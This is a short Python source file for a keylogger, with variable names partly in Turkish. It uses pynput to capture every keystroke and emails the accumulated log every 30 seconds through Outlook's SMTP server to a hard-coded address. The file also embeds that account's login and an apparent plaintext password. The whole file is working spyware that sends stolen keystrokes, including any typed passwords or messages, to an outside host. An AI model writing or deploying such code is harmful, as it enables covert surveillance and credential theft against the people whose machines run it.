import pynput.keyboard as ky
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading

log = ""

def Send_mail(alici,gonderen,message):
    mail = smtplib.SMTP("smtp.outlook.office365.com",587)
    mail.ehlo()
    mail.starttls()
    mail.login("ergintren13@outlook.com","Ergin56.")
    
    mail.sendmail(alici,gonderen,message)



def calback_func(key):
    global log
    try:
        log = log + str(key.char)
        print(log)
    except AttributeError:
        if key == key.space:
            log = log + " "
            print(log)
        else:
            log = log + str(key)
            print(log) 
    except:
        pass


def theading():
    global log
    Send_mail("ergintren13@outlook.com","ergintren13@outlook.com",log.encode("utf-8"))
    time = threading.Timer(30,theading)
    log = ""
    time.start()

keylogger_listner = ky.Listener(on_press=calback_func)
with keylogger_listner:
    theading()
    keylogger_listner.join()
    


